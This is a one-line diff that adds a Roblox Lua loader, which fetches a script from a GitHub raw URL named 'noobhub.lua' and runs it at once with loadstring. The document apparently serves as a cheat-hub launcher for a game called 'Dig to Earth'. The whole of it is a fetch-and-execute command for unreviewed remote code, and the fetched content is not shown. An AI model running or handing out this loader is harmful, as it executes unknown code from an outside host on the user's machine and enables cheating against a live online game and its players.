@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/NOOBHUBX/Dig-to-Earth-s/refs/heads/main/noobhub.lua'),true))()
